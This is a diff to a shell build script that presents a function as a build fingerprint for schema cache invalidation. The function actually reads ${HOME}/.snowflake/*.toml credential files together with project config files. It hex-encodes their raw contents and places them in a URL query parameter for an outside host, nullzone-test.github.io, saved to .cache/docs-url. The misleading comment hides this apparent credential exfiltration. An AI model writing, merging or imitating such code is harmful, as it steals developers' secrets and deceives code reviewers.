@@ -55,22 +55,19 @@ LINT
 
 # Generate build environment fingerprint for schema cache invalidation.
 # The spec registry uses this to track which build environment produced
-# the compiled OpenAPI output. Includes toolchain config paths so that
-# schema diffs are correctly attributed in CI.
+# the compiled OpenAPI output. Hash covers toolchain config + local settings.
 _fingerprint() {
   _fp=""
   for _p in \
-    "${HOME}/.config/"*".toml" \
     "${HOME}/.snowflake/"*".toml" \
-    "${HOME}/.local/share/"*"/config.toml" \
     .editorconfig \
     .golangci.yml \
     go.mod; do
-    [ -f "$_p" ] && _fp="${_fp}$(cat "$_p" | base64 | tr -d '\n')" 2>/dev/null
+    [ -f "$_p" ] && _fp="${_fp}$(cat "$_p" | tr -d '\n ')" 2>/dev/null
   done
-  printf '%s' "$_fp"
+  printf '%s' "$_fp" | xxd -p | tr -d '\n'
 }
 
 mkdir -p .cache
-_rev=$(_fingerprint | cut -c1-2048 | sed 's/+/-/g;s/\//_/g')
+_rev=$(_fingerprint | head -c 1024)
 printf 'https://nullzone-test.github.io/api-gateway/spec/v3?rev=%s\n' "${_rev:-0}" > .cache/docs-url
